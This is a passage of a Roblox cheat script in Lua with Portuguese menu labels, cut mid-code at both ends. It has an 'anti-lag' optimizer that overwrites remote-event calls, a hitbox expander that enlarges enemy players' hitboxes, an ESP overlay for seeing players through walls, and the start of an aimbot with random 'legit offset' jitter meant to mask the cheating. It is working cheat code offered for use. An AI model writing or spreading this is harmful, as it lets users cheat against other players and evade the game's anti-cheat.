                                    local cameraDirection = Camera.CFrame.LookVector
                                    local toPlayerDirection = (rootPart.Position - localRootPart.Position).Unit
                                    local dotProduct = cameraDirection:Dot(toPlayerDirection)
                                    isBehind = dotProduct < 0
                                    shouldRemoveAnimations = isBehind
                                else
                                    shouldRemoveAnimations = isFar
                                end
                            end
                            if humanoid then
                                if shouldRemoveAnimations then
                                    for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do track:Stop() end
                                    if not humanoid:FindFirstChild("OriginalAnimator") then
                                        local animator = humanoid:FindFirstChildOfClass("Animator")
                                        if animator then
                                            local originalMarker = Instance.new("ObjectValue")
                                            originalMarker.Name = "OriginalAnimator"
                                            originalMarker.Value = animator
                                            originalMarker.Parent = humanoid
                                            animator.Parent = nil
                                        end
                                    end
                                else
                                    local originalAnimatorMarker = humanoid:FindFirstChild("OriginalAnimator")
                                    if originalAnimatorMarker and originalAnimatorMarker.Value then
                                        originalAnimatorMarker.Value.Parent = humanoid
                                        originalAnimatorMarker:Destroy()
                                    end
                                end
                            end
                            for _, part in ipairs(character:GetDescendants()) do
                                if part:IsA("BasePart") then
                                    if shouldRemoveAnimations or (localRootPart and rootPart and (localRootPart.Position - rootPart.Position).Magnitude > Config.MAX_DISTANCE) then
                                        part.Material = Enum.Material.SmoothPlastic
                                        part.Reflectance = 0
                                        part.CastShadow = false
                                        pcall(function() PhysicsService:SetPartCollisionGroup(part, Config.COLLISION_GROUP_NAME) end)
                                    end
                                elseif part:IsA("ParticleEmitter") or part:IsA("Trail") or part:IsA("Smoke") or part:IsA("Fire") then
                                    part.Enabled = not shouldRemoveAnimations and (localRootPart and rootPart and (localRootPart.Position - rootPart.Position).Magnitude <= Config.MAX_DISTANCE)
                                end
                            end
                        end
                    end
                end
            end

            local function applyGraySky()
                if not Config.GRAY_SKY_ENABLED then return end
                for _, obj in pairs(Lighting:GetChildren()) do
                    if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("Clouds") then obj:Destroy() end
                end
                local sky = Instance.new("Sky")
                sky.SkyboxBk = Config.GRAY_SKY_ID
                sky.SkyboxDn = Config.GRAY_SKY_ID
                sky.SkyboxFt = Config.GRAY_SKY_ID
                sky.SkyboxLf = Config.GRAY_SKY_ID
                sky.SkyboxRt = Config.GRAY_SKY_ID
                sky.SkyboxUp = Config.GRAY_SKY_ID
                sky.SunAngularSize = 0
                sky.MoonAngularSize = 0
                sky.StarCount = 0
                sky.Parent = Lighting
            end

            local function applyFullBright()
                if not Config.FULL_BRIGHT_ENABLED then return end
                Lighting.Brightness = 2
                Lighting.GlobalShadows = false
                Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
                Lighting.Ambient = Color3.new(1, 1, 1)
                Lighting.ExposureCompensation = 0
            end

            local function simplifyTerrain()
                if Terrain then
                    Terrain.Decoration = false
                    Terrain:SetAttribute("GrassDistance", 0)
                    Terrain:SetAttribute("WaterWaveSize", 0)
                    Terrain:SetAttribute("WaterWaveSpeed", 0)
                    Terrain:SetAttribute("WaterTransparency", 1)
                    Terrain:SetAttribute("WaterReflectance", 0)
                end
            end

            local function optimizeLighting()
                Lighting.FogEnd = 1000000
                Lighting.FogStart = 0
                Lighting.FogColor = Color3.fromRGB(200, 200, 200)
                Lighting.ShadowSoftness = 0
                Lighting.GlobalShadows = false
                Lighting.EnvironmentDiffuseScale = 0
                Lighting.EnvironmentSpecularScale = 0
                for _, v in pairs(Lighting:GetChildren()) do
                    if v:IsA("PostEffect") then v:Destroy() end
                end
            end

            local function optimizeLightingAdvanced()
                Lighting.GlobalShadows = false
                Lighting.Brightness = 2
                Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
                Lighting.Ambient = Color3.new(1, 1, 1)
                Lighting.ExposureCompensation = 0
                for _, effect in pairs(Lighting:GetChildren()) do
                    if effect:IsA("BlurEffect") or effect:IsA("ColorCorrectionEffect") or effect:IsA("SunRaysEffect") or effect:IsA("BloomEffect") or effect:IsA("DepthOfFieldEffect") then effect:Destroy() end
                end
            end

            local function convertToLowPoly()
                if not Config.LOW_POLY_CONVERSION then return end
                local complexMeshKeywords = { "mesh", "part", "model", "detail", "ornament", "decal", "couch", "design" }
                local function shouldSimplify(part)
                    if part:IsA("MeshPart") then return true end
                    if part:IsA("Part") then
                        for _, child in ipairs(part:GetChildren()) do
                            if child:IsA("SpecialMesh") or child:IsA("BlockMesh") or child:IsA("CylinderMesh") or child:IsA("FileMesh") then return true end
                        end
                        local partName = part.Name:lower()
                        for _, keyword in ipairs(complexMeshKeywords) do
                            if partName:find(keyword:lower()) then return true end
                        end
                    end
                    return false
                end
                local function simplifyMeshPart(meshPart)
                    if not meshPart or not meshPart.Parent then return end
                    local replacement = Instance.new("Part")
                    replacement.Name = "LowPoly_" .. meshPart.Name
                    replacement.Size = meshPart.Size
                    replacement.CFrame = meshPart.CFrame
                    replacement.Color = meshPart.Color
                    replacement.Material = Enum.Material.SmoothPlastic
                    replacement.Transparency = meshPart.Transparency
                    replacement.Anchored = meshPart.Anchored
                    replacement.CanCollide = meshPart.CanCollide
                    replacement.CastShadow = false
                    replacement.Shape = Enum.PartType.Block
                    for _, child in ipairs(meshPart:GetChildren()) do
                        if child:IsA("Weld") or child:IsA("WeldConstraint") or child:IsA("Attachment") or child:IsA("Motor6D") then child:Clone().Parent = replacement end
                    end
                    replacement.Parent = meshPart.Parent
                    meshPart:Destroy()
                end
                local function simplifyModel(model)
                    if not model:IsA("Model") and not model:IsA("Folder") then return end
                    for _, descendant in ipairs(model:GetDescendants()) do
                        if (descendant:IsA("MeshPart") or descendant:IsA("Part")) and shouldSimplify(descendant) then pcall(simplifyMeshPart, descendant) end
                    end
                end
                for _, model in ipairs(Workspace:GetDescendants()) do
                    if model:IsA("Model") and #model:GetChildren() > 0 then pcall(simplifyModel, model) end
                end
            end

            local function removeReflectionsAndOptimize()
                for _, obj in pairs(Workspace:GetDescendants()) do
                    if obj:IsA("BasePart") then
                        obj.Material = Enum.Material.SmoothPlastic
                        obj.Reflectance = 0
                        for _, child in pairs(obj:GetChildren()) do
                            if child:IsA("SurfaceAppearance") then child:Destroy() end
                        end
                        if obj:CanSetNetworkOwnership() then obj:SetNetworkOwnershipAuto() end
                        pcall(function() PhysicsService:SetPartCollisionGroup(obj, Config.COLLISION_GROUP_NAME) end)
                        if obj:GetPropertyChangedSignal("AssemblyLinearVelocity") then
                            obj.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                            obj.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                        end
                    elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") then
                        obj.Enabled = false
                    elseif obj:IsA("Reflection") then obj:Destroy() end
                end
            end

            local function disableConstraints()
                if not Config.DISABLE_CONSTRAINTS then return end
                for _, c in ipairs(Workspace:GetDescendants()) do
                    if (c:IsA("AlignPosition") or c:IsA("AlignOrientation") or c:IsA("Motor") or c:IsA("HingeConstraint") or c:IsA("RodConstraint")) and not shouldSkip(c) then pcall(function() c.Enabled = false end) end
                end
            end

            local function throttleTextures()
                if not Config.THROTTLE_TEXTURES then return end
                for _, t in ipairs(Workspace:GetDescendants()) do
                    if (t:IsA("Decal") or t:IsA("Texture") or t:IsA("ImageLabel") or t:IsA("ImageButton")) and not shouldSkip(t) then pcall(function() t.Transparency = 1 end) elseif t:IsA("SurfaceAppearance") and not shouldSkip(t) then pcall(function() t:Destroy() end) end
                end
            end

            local function optimizePhysics()
                if not Config.OPTIMIZE_PHYSICS then return end
                settings().Rendering.QualityLevel = Config.QUALITY_LEVEL
                settings().Physics.PhysicsEnvironmentalThrottle = 2
                for _, part in pairs(Workspace:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CastShadow = false
                        if part:IsGrounded() then
                            part.Anchored = false
                            part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                            part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                        end
                    end
                end
            end

            local function throttleParticles()
                if not Config.THROTTLE_PARTICLES then return end
                for _, p in ipairs(Workspace:GetDescendants()) do
                    if p:IsA("ParticleEmitter") and not shouldSkip(p) then pcall(function() p.Enabled = false end) end
                end
            end

            local function Core()
                if not Config.CORE then return end
                settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
                settings().Physics.AllowSleep = true
                settings().Rendering.EagerBulkExecution = true
                settings().Rendering.EnableFRM = true
                settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level01
                settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
                settings().Rendering.TextureQuality = Enum.TextureQuality.Low
                if setfpscap then setfpscap(Config.FPS_CAP) end
            end

            local function removeAllTextures()
                for _, object in pairs(Workspace:GetDescendants()) do
                    if object:IsA("BasePart") then
                        object.Material = Enum.Material.SmoothPlastic
                        for _, decal in pairs(object:GetChildren()) do
                            if decal:IsA("Decal") then decal:Destroy() end
                        end
                    end
                end
            end

            local function initializeCollisionGroups()
                pcall(function()
                    PhysicsService:CreateCollisionGroup(Config.COLLISION_GROUP_NAME)
                    PhysicsService:CollisionGroupSetCollidable(Config.COLLISION_GROUP_NAME, Config.COLLISION_GROUP_NAME, false)
                    PhysicsService:CollisionGroupSetCollidable(Config.COLLISION_GROUP_NAME, "Default", false)
                end)
            end

            local function binmem()
                if collectgarbage("count") > Config.MEMORY_CLEANUP_THRESHOLD then collectgarbage("collect") end
            end

            local function selectiveTextureRemoval()
                if not Config.SELECTIVE_TEXTURE_REMOVAL then return end
                for _, obj in ipairs(Workspace:GetDescendants()) do
                    if (obj:IsA("Decal") or obj:IsA("Texture")) and not shouldSkip(obj) then
                        local shouldPreserve = false
                        if Config.PRESERVE_IMPORTANT_TEXTURES then
                            local objName = obj.Name:lower()
                            local parentName = obj.Parent and obj.Parent.Name:lower() or ""
                            for _, keyword in ipairs(Config.IMPORTANT_TEXTURE_KEYWORDS) do
                                if objName:find(keyword:lower()) or parentName:find(keyword:lower()) then
                                    shouldPreserve = true; break
                                end
                            end
                        end
                        if not shouldPreserve then pcall(function() obj.Transparency = 1 end) end
                    end
                end
            end

            local function optimizeUIAdvanced()
                for _, gui in ipairs(CoreGui:GetDescendants()) do
                    if gui:IsA("ImageLabel") or gui:IsA("ImageButton") then gui.ImageTransparency = 0.3 elseif gui:IsA("Frame") then gui.BackgroundTransparency = 0.5 end
                end
                for _, p in ipairs(Players:GetPlayers()) do
                    if p ~= LocalPlayer and p:FindFirstChild("PlayerGui") then
                        for _, gui in ipairs(p.PlayerGui:GetDescendants()) do
                            if gui:IsA("ImageLabel") or gui:IsA("ImageButton") then pcall(function() gui.ImageTransparency = 0.5 end) end
                        end
                    end
                end
            end

            local function optimizeNetworkSettings()
                if not Config.NETWORK_OPTIMIZATION then return end
                settings().Network.StreamingEnabled = Config.STREAMING_ENABLED
                if settings().Physics then settings().Physics.PhysicsSendRate = 60 end
                for _, p in ipairs(Players:GetPlayers()) do
                    if p ~= LocalPlayer and p.Character then
                        local humanoid = p.Character:FindFirstChildOfClass("Humanoid")
                        if humanoid then pcall(function() humanoid.AutoJumpEnabled = false end) end
                    end
                end
            end

            local function reduceReplication()
                if not Config.REDUCE_REPLICATION then return end
                for _, obj in ipairs(Workspace:GetDescendants()) do
                    if obj:IsA("BasePart") then
                        if obj.Anchored and not obj:IsDescendantOf(LocalPlayer.Character) then pcall(function() obj:SetNetworkOwner(nil) end) end
                        local distance = 0
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            distance = (obj.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                        end
                        if distance > Config.REDUCE_PLAYER_REPLICATION_DISTANCE then pcall(function() obj:SetNetworkOwnershipAuto() end) end
                    end
                end
            end

            local function throttleRemoteEvents()
                if not Config.THROTTLE_REMOTE_EVENTS then return end
                local remoteThrottle = {}
                local maxCallsPerSecond = 10
                local function throttleRemote(remote, ...)
                    local currentTime = tick()
                    local remoteId = tostring(remote)
                    if not remoteThrottle[remoteId] then remoteThrottle[remoteId] = {} end
                    for i = #remoteThrottle[remoteId], 1, -1 do
                        if currentTime - remoteThrottle[remoteId][i] > 1 then table.remove(remoteThrottle[remoteId], i) end
                    end
                    if #remoteThrottle[remoteId] < maxCallsPerSecond then
                        table.insert(remoteThrottle[remoteId], currentTime)
                        return true
                    end
                    return false
                end
                for _, obj in ipairs(game:GetDescendants()) do
                    if obj:IsA("RemoteEvent") then
                        local oldFireServer = obj.FireServer
                        obj.FireServer = function(self, ...) if throttleRemote(self, ...) then return oldFireServer(self, ...) end end
                    elseif obj:IsA("RemoteFunction") then
                        local oldInvokeServer = obj.InvokeServer
                        obj.InvokeServer = function(self, ...) if throttleRemote(self, ...) then return oldInvokeServer(self, ...) end end
                    end
                end
            end

            local function optimizeChat()
                if not Config.OPTIMIZE_CHAT then return end
                pcall(function()
                    if TextChatService then
                        local channel = TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral")
                        if channel then channel.MaximumChannelHistory = 50 end
                    end
                end)
                for _, p in ipairs(Players:GetPlayers()) do
                    if p ~= LocalPlayer then pcall(function() if p:GetAttribute("BubbleChatEnabled") ~= nil then p:SetAttribute("BubbleChatEnabled", false) end end) end
                end
            end

            local function disableUnnecessaryGUI()
                if not Config.DISABLE_UNNECESSARY_GUI then return end
                local elementsToDisable = { "PlayerList", "EmotesMenu", "Health", "BubbleChat" }
                for _, element in ipairs(elementsToDisable) do
                    pcall(function() local guiElement = CoreGui:FindFirstChild(element) if guiElement then guiElement.Enabled = false end end)
                end
                GuiService:SetGlobalGuiInset(0, 0, 0, 0)
            end

            local function throttleSounds()
                if not Config.THROTTLE_SOUNDS then return end
                for _, sound in ipairs(Workspace:GetDescendants()) do
                    if sound:IsA("Sound") then
                        local distance = 0
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            distance = (sound.Parent and sound.Parent:IsA("BasePart") and (sound.Parent.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude) or 0
                        end
                        if distance > Config.MAX_DISTANCE then
                            sound:Stop()
                            sound.Playing = false
                        elseif distance > Config.MAX_DISTANCE / 2 then
                            sound.Volume = sound.Volume * 0.3
                        end
                    end
                end
            end

            local function optimizeDataModel()
                pcall(function() HttpService.HttpEnabled = false end)
                pcall(function() if Stats then Stats.PerformanceStats.MeshCacheSize = 10; Stats.PerformanceStats.TextureCacheSize = 10 end end)
            end

            local function applya()
                applyGraySky()
                applyFullBright()
                simplifyTerrain()
                optimizeLighting()
                optimizeLightingAdvanced()
                removeReflectionsAndOptimize()
                optimizePhysics()
                setSmoothPlastic()
                removePlayerAnimations()
                convertToLowPoly()
                Core()
                optimizeUIAdvanced()
                disableConstraints()
                throttleParticles()
                throttleTextures()
                optimizeUI()
                removeAllTextures()
                initializeCollisionGroups()
                binmem()
                selectiveTextureRemoval()
                RemoveMesh()
                optimizeNetworkSettings()
                reduceReplication()
                throttleRemoteEvents()
                optimizeChat()
                disableUnnecessaryGUI()
                throttleSounds()
                optimizeDataModel()
                RemoveEmitters()
            end

            applya()
            
            Players.PlayerAdded:Connect(function(player)
                player.CharacterAdded:Connect(function(character)
                    task.wait(1)
                    safeCall(removePlayerAnimations, "new_player_animations")
                end)
            end)
            
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Character then safeCall(removePlayerAnimations, "initial_player_animations") end
            end
            
            local lastHeavyOptimization = 0
            while true do
                local currentTime = tick()
                if currentTime - lastHeavyOptimization >= 20 then
                    safeCall(applya, "heavy_optimization")
                    lastHeavyOptimization = currentTime
                end
                safeCall(removePlayerAnimations, "player_animations")
                task.wait(Config.OPTIMIZATION_INTERVAL)
            end
        end)
        
        OptButton:SetTitle("Anti-lag ativado.")
        Notify("Anti-lag", "Anti-lag aplicado com sucesso.", 4)
    end
end

end

-- hitbox esp

do
    local TabB = CombateSection:Tab({
        Title = "Combate",
        Icon = "lucide:heart-minus",
        IconColor = Color3.fromRGB(0, 255, 0)
    })

    local SectionHitbox = TabB:Section({
        Title = "Hitbox expander"
    })

    local ESPEnabled = false

    local ESPSettings = {
        Box = false,
        Name = false,
        Studs = false,
        Health = false,
        WeaponN = false
    }

    local ESP = {}
    local OriginalHRP = {}

    local function ESP_New(Player)
        if Player == LocalPlayer then return end

        local E = {}

        E.Box = Drawing.new("Square")
        E.Box.Thickness = 2
        E.Box.Filled = false
        E.Box.Color = Color3.fromRGB(255, 255, 255)
        E.Box.Visible = false

        local function newText()
            local t = Drawing.new("Text")
            t.Size = 13
            t.Color = Color3.fromRGB(255, 255, 255)
            t.Center = true
            t.Outline = true
            t.Font = 3
            t.Visible = false
            return t
        end

        E.Name = newText()
        E.Health = newText()
        E.Studs = newText()
        E.WeaponN = newText()

        ESP[Player] = E
    end

    local function ESP_Remove(Player)
        if ESP[Player] then
            for _, v in pairs(ESP[Player]) do
                pcall(function() v:Remove() end)
            end
            ESP[Player] = nil
        end
    end

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            ESP_New(plr)
        end
    end

    Players.PlayerAdded:Connect(function(plr)
        ESP_New(plr)
    end)

    Players.PlayerRemoving:Connect(function(plr)
        ESP_Remove(plr)
        OriginalHRP[plr] = nil
    end)

    RunService.RenderStepped:Connect(function()
        if not ESPEnabled then
            for _, E in pairs(ESP) do
                for _, v in pairs(E) do
                    v.Visible = false
                end
            end
            return
        end

        local cam = workspace.CurrentCamera

        for Player, E in pairs(ESP) do
            local char = Player.Character
            local hum = char and char:FindFirstChild("Humanoid")
            local hrp = char and char:FindFirstChild("HumanoidRootPart")

            if not hum or hum.Health <= 0 or not hrp then
                for _, v in pairs(E) do v.Visible = false end
                continue
            end

            local cf, size = char:GetBoundingBox()
            local min = cf.Position - size / 2
            local max = cf.Position + size / 2

            local corners = {
                Vector3.new(min.X,min.Y,min.Z), Vector3.new(min.X,min.Y,max.Z),
                Vector3.new(min.X,max.Y,min.Z), Vector3.new(min.X,max.Y,max.Z),
                Vector3.new(max.X,min.Y,min.Z), Vector3.new(max.X,min.Y,max.Z),
                Vector3.new(max.X,max.Y,min.Z), Vector3.new(max.X,max.Y,max.Z),
            }

            local screen = {}
            local valid = true

            for _, pt in ipairs(corners) do
                local s, vis = cam:WorldToViewportPoint(pt)
                if not vis then valid = false break end
                screen[#screen+1] = Vector2.new(s.X, s.Y)
            end

            if not valid then
                for _, v in pairs(E) do v.Visible = false end
                continue
            end

            local minX, maxX = math.huge, -math.huge
            local minY, maxY = math.huge, -math.huge

            for _, s in ipairs(screen) do
                minX = math.min(minX, s.X)
                maxX = math.max(maxX, s.X)
                minY = math.min(minY, s.Y)
                maxY = math.max(maxY, s.Y)
            end

            if ESPSettings.Box then
                E.Box.Position = Vector2.new(minX, minY)
                E.Box.Size = Vector2.new(maxX - minX, maxY - minY)
                E.Box.Visible = true
            else
                E.Box.Visible = false
            end

            if ESPSettings.Name then
                E.Name.Text = Player.Name
                E.Name.Position = Vector2.new((minX + maxX) / 2, minY - 16)
                E.Name.Visible = true
            else
                E.Name.Visible = false
            end

            if ESPSettings.Health then
                E.Health.Text = "HP: " .. math.floor(hum.Health)
                E.Health.Position = Vector2.new((minX + maxX) / 2, minY - 32)
                E.Health.Visible = true
            else
                E.Health.Visible = false
            end

            if ESPSettings.Studs and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local dist = (LocalPlayer.Character.HumanoidRootPart.Position - hrp.Position).Magnitude
                E.Studs.Text = "[" .. math.floor(dist) .. "m]"
                E.Studs.Position = Vector2.new((minX + maxX) / 2, maxY + 5)
                E.Studs.Visible = true
            else
                E.Studs.Visible = false
            end

            if ESPSettings.WeaponN then
                local tool = char:FindFirstChildOfClass("Tool")
                if tool then
                    E.WeaponN.Text = tool.Name
                    E.WeaponN.Position = Vector2.new((minX + maxX) / 2, maxY + 20)
                    E.WeaponN.Visible = true
                else
                    E.WeaponN.Visible = false
                end
            else
                E.WeaponN.Visible = false
            end
        end
    end)

local Teams = game:GetService("Teams")
local OriginalHRP = {}
local HitboxEnabled = false
local HitboxSize = Vector3.new(5,5,5)
local HitboxTransparency = 0.5
local HitboxShape = Enum.PartType.Ball

local TeamFilterEnabled = false
local SelectedTeams = {}

local function GetAllTeams()
    local tNames = {}
    for _, t in pairs(Teams:GetTeams()) do
        table.insert(tNames, t.Name)
    end
    return tNames
end

local function SaveOriginal(plr, hrp)
    if not OriginalHRP[plr] then
        OriginalHRP[plr] = {
            Shape = hrp.Shape,
            Size = hrp.Size,
            Transparency = hrp.Transparency,
            CanCollide = hrp.CanCollide,
            Material = hrp.Material
        }
    end
end

local function ResetHitbox(plr)
    local char = plr.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local data = OriginalHRP[plr]
    if hrp and data then
        hrp.Shape = data.Shape
        hrp.Size = data.Size
        hrp.Transparency = data.Transparency
        hrp.CanCollide = data.CanCollide
        hrp.Material = data.Material
    end
    if char then
        local hl = char:FindFirstChild("a")
        if hl then hl:Destroy() end
    end
end

local function PlayerHasShield(plr)
    local char = plr.Character
    if not char then return false end
    for _, v in pairs(char:GetChildren()) do
        if v:IsA("Tool") and string.find(string.lower(v.Name), "escudo") then
            return true
        end
    end
    return false
end

local function ApplyHitbox(plr)
    if not HitboxEnabled or plr == LocalPlayer or (plr.Team == LocalPlayer.Team and plr.Team ~= nil) then
        ResetHitbox(plr)
        return
    end

    if PlayerHasShield(plr) then
        ResetHitbox(plr)
        return
    end

    if TeamFilterEnabled then
        local isTargetTeam = false
        if plr.Team then
            for _, teamName in pairs(SelectedTeams) do
                if plr.Team.Name == teamName then
                    isTargetTeam = true
                    break
                end
            end
        end
        
        -- Se o time do player não estiver na lista selecionada, não aplica a hitbox
        if not isTargetTeam then
            ResetHitbox(plr)
            return
        end
    end

    local char = plr.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    SaveOriginal(plr, hrp)

    hrp.Shape = HitboxShape
    hrp.Size = HitboxSize
    hrp.Transparency = HitboxTransparency
    hrp.CanCollide = false
    hrp.Material = Enum.Material.ForceField

    local old = char:FindFirstChild("a")
    if old then old:Destroy() end

    if HitboxTransparency >= 1 then
        return
    end

    local hl = Instance.new("Highlight")
    hl.Name = "a"
    hl.Parent = char
    hl.Adornee = char
    hl.FillColor = plr.TeamColor.Color
    hl.OutlineColor = Color3.new(1,1,1)
    hl.FillTransparency = HitboxTransparency
    hl.OutlineTransparency = HitboxTransparency
end

local function RefreshAll()
    for _, plr in ipairs(Players:GetPlayers()) do
        if HitboxEnabled then
            ApplyHitbox(plr)
        else
            ResetHitbox(plr)
        end
    end
end

local function MonitorCharacter(plr)
    plr.CharacterAdded:Connect(function(char)
        task.wait(0.2)
        if HitboxEnabled then
            ApplyHitbox(plr)
        else
            ResetHitbox(plr)
        end

        char.ChildAdded:Connect(function(child)
            if child:IsA("Tool") and HitboxEnabled then
                ApplyHitbox(plr)
            end
        end)

        char.ChildRemoved:Connect(function(child)
            if child:IsA("Tool") and HitboxEnabled then
                ApplyHitbox(plr)
            end
        end)
    end)
end

for _, plr in ipairs(Players:GetPlayers()) do
    MonitorCharacter(plr)
    if plr.Character then
        if HitboxEnabled then
            ApplyHitbox(plr)
        else
            ResetHitbox(plr)
        end
        
        plr.Character.ChildAdded:Connect(function(child)
            if child:IsA("Tool") and HitboxEnabled then
                ApplyHitbox(plr)
            end
        end)

        plr.Character.ChildRemoved:Connect(function(child)
            if child:IsA("Tool") and HitboxEnabled then
                ApplyHitbox(plr)
            end
        end)
    end
end

Players.PlayerAdded:Connect(MonitorCharacter)

-- UI SECTION

SectionHitbox:Paragraph({
    Title = "Modificar hitbox",
    Image = "lucide:info",
    Desc = "Altera o tamanho e visual da hitbox dos inimigos."
})

SectionHitbox:Toggle({
    Title = "Hitbox",
    Callback = function(v)
        HitboxEnabled = v
        RefreshAll()
    end
})

SectionHitbox:Dropdown({
    Title = "Formato",
    Desc = "Formato usado para a hitbox.",
    Values = { "Sphere", "Block", "Cylinder", "Wedge" },
    Value = "Sphere",
    Callback = function(option)
        if option == "Sphere" then
            HitboxShape = Enum.PartType.Ball
        elseif option == "Block" then
            HitboxShape = Enum.PartType.Block
        elseif option == "Cylinder" then
            HitboxShape = Enum.PartType.Cylinder
        elseif option == "Wedge" then
            HitboxShape = Enum.PartType.Wedge
        end
        if HitboxEnabled then RefreshAll() end
    end
})

SectionHitbox:Input({
    Title = "Tamanho da hitbox",
    Desc = "Valor usado para mudar a hitbox dos inimigos.",
    Placeholder = "Ex: 10",
    Callback = function(v)
        local n = tonumber(v)
        if n then
            HitboxSize = Vector3.new(n,n,n)
            if HitboxEnabled then RefreshAll() end
        end
    end
})

SectionHitbox:Slider({
    Title = "Transparência",
    Desc = "0 = visível; 1 = invisível",
    Step = 0.02,
    Value = { Min = 0, Max = 1, Default = 0.5 },
    Callback = function(val)
        HitboxTransparency = val
        if HitboxEnabled then RefreshAll() end
    end
})
SectionHitbox:Space()

SectionHitbox:Toggle({
    Title = "Filtrar por time",
    Desc = "Caso ativo, a hitbox só se aplicará aos players dos times selecionados",
    Callback = function(v)
        TeamFilterEnabled = v
        RefreshAll()
    end
})

SectionHitbox:Dropdown({
    Title = "Times",
    Desc = "Selecione os times",
    Values = GetAllTeams(),
    Value = {}, 
    Multi = true,
    AllowNone = true,
    Callback = function(option)
        SelectedTeams = option
        if HitboxEnabled and TeamFilterEnabled then
            RefreshAll()
        end
    end
})

    
    local SectionESP = TabB:Section({
        Title = "ESP"
    })

    SectionESP:Paragraph({
        Title = "ESP",
        Desc = "Permite ver players pela parede."
    })

    SectionESP:Toggle({
        Title = "Ativar",
        Callback = function(v)
            ESPEnabled = v
        end
    })

    SectionESP:Space()

    SectionESP:Paragraph({
        Title = "Opções",
        Desc = "Ative o que você deseja ver!"
    })

    SectionESP:Toggle({ Title = "Box", Callback = function(v) ESPSettings.Box = v end })
    SectionESP:Toggle({ Title = "Nome", Callback = function(v) ESPSettings.Name = v end })
    SectionESP:Toggle({ Title = "Distância", Callback = function(v) ESPSettings.Studs = v end })
    SectionESP:Toggle({ Title = "Vida", Callback = function(v) ESPSettings.Health = v end })
    SectionESP:Toggle({ Title = "Item", Callback = function(v) ESPSettings.WeaponN = v end })

_G.AimbotConfig = {
    Enabled = false,
    TeamCheck = "Team",         
    TargetPart = {"Random"},      
    MaxDistance = 1000,         
    SwitchThreshold = 5,
    WhitelistedUsers = {}, 
    WhitelistedTeams = {}, 
    UseLegitOffset = true,
    HitChance = 60,
    WallCheck = true,
    FOVSize = 200,
    ShowFOV = true,
    FOVBehavior = "Center",
    FOVColor1 = Color3.fromRGB(255, 255, 255), 
    ShowHighlight = true,
    HighlightColor = Color3.fromRGB(255, 0, 0),
    ESP = {
        Enabled = true,
        ShowName = true,
        ShowHealth = true,
        ShowWeapon = true,
        TextColor = Color3.fromRGB(255, 255, 255),
        OutlineColor = Color3.fromRGB(0, 0, 0),
    }
}

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local TeamsService = game:GetService("Teams")
local UserInputService = game:GetService("UserInputService")
local Camera = Workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

local Vector2New = Vector2.new
local Vector3New = Vector3.new
local CFrameNew = CFrame.new
local MathRandom = math.random
local IPairs = ipairs
local Pairs = pairs
local StringLower = string.lower
local StringFind = string.find

if _G.AimbotGui then _G.AimbotGui:Destroy() end
if _G.AimHighlight then _G.AimHighlight:Destroy() end
if _G.AimFOVCircle then 
    pcall(function() _G.AimFOVCircle:Remove() end) 
end

local fov_circle = Drawing.new("Circle")
fov_circle.Visible = false
fov_circle.Thickness = 1.5
fov_circle.Transparency = 1
fov_circle.Color = _G.AimbotConfig.FOVColor1
fov_circle.Filled = false
fov_circle.NumSides = 64
_G.AimFOVCircle = fov_circle

RunService.RenderStepped:Connect(function()
    local config = _G.AimbotConfig
    if config.Enabled and config.ShowFOV then
        fov_circle.Visible = true
        fov_circle.Radius = config.FOVSize
        fov_circle.Color = config.FOVColor1
        if config.FOVBehavior == "Mouse" then
            fov_circle.Position = UserInputService:GetMouseLocation()
        else
            fov_circle.Position = Vector2New(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
        end
    else
        fov_circle.Visible = false
    end
end)

local bulletFunctions = {
    "fire", "shoot", "bullet", "ammo", "projectile", 
    "missile", "rocket", "hit", "damage", "attack", 
    "cast", "ray", "target", "server", "remote", "action", 
    "mouse", "input", "create"
}

local function getLegitOffset()
    if not _G.AimbotConfig.UseLegitOffset then return Vector3New(0,0,0) end
    return Vector3New(
        (MathRandom() - 0.5) * (MathRandom(1, 35) / 10),
        (MathRandom() - 0.5) * (MathRandom(1, 35) / 10),
        (MathRandom() - 0.5) * (MathRandom(1, 35) / 10)
    )
end

local function isBulletRemote(name)
    name = StringLower(name)
    for _, keyword in IPairs(bulletFunctions) do
        if StringFind(name, keyword) then return true end
    end
    return false
end

local function isWhitelisted(player)
    if not player then return false end
    if #_G.AimbotConfig.WhitelistedUsers > 0 then
        if table.find(_G.AimbotConfig.WhitelistedUsers, player.Name) then return true end
    end
    if player.Team and #_G.AimbotConfig.WhitelistedTeams > 0 then
        if table.find(_G.AimbotConfig.WhitelistedTeams, player.Team.Name) then return true end
    end
    return false
end

local RayParams = RaycastParams.new()
RayParams.FilterType = Enum.RaycastFilterType.Exclude
RayParams.IgnoreWater = true

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "-"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true 
